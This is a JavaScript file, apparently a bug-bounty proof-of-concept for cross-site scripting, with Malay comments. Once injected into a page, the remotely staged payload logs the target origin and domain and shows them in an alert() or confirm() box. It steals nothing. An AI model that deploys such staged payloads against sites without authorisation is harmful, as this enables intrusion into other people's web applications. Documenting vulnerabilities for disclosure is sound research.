// ==============================================================================
// 🎯 REMOTE STAGED PAYLOAD (Proof-of-Concept)
// Projek Hos: saas_house (Next.js Frontend Public Staging)
// Laluan Akses: https://domain-anda.com/staged/poc.js
// ==============================================================================

(function () {
    'use strict';

    // 1. Dapatkan maklumat konteks pelaksanaan sasaran
    const targetDomain = document.domain || location.hostname;
    const targetOrigin = location.origin;
    const timestamp = new Date().toISOString();

    // 2. Log diagnostik pada konsol pelayar mangsa/sasaran
    console.log(
        '%c[Abu Hanifah Security] Remote Staged PoC Executed!',
        'color: #00ff00; font-weight: bold; background: #222; padding: 4px 8px; border-radius: 4px;'
    );
    console.log('[+] Target Origin :', targetOrigin);
    console.log('[+] Target Domain :', targetDomain);
    console.log('[+] Executed At   :', timestamp);

    // 3. Paparkan bukti pelaksanaan selamat (Standard Emas Bug Bounty)
    try {
        // Menggunakan alert(document.domain) untuk membuktikan origin sasaran ditembusi
        alert('XSS PoC Executed via Remote Staged Payload!\n\nTarget Domain: ' + targetDomain);
    } catch (e) {
        // Fallback sekiranya fungsi alert disekat oleh pelayar moden
        console.warn('[-] alert() blocked, triggering fallback confirm():', e);
        confirm('XSS PoC: ' + targetDomain);
    }

})();
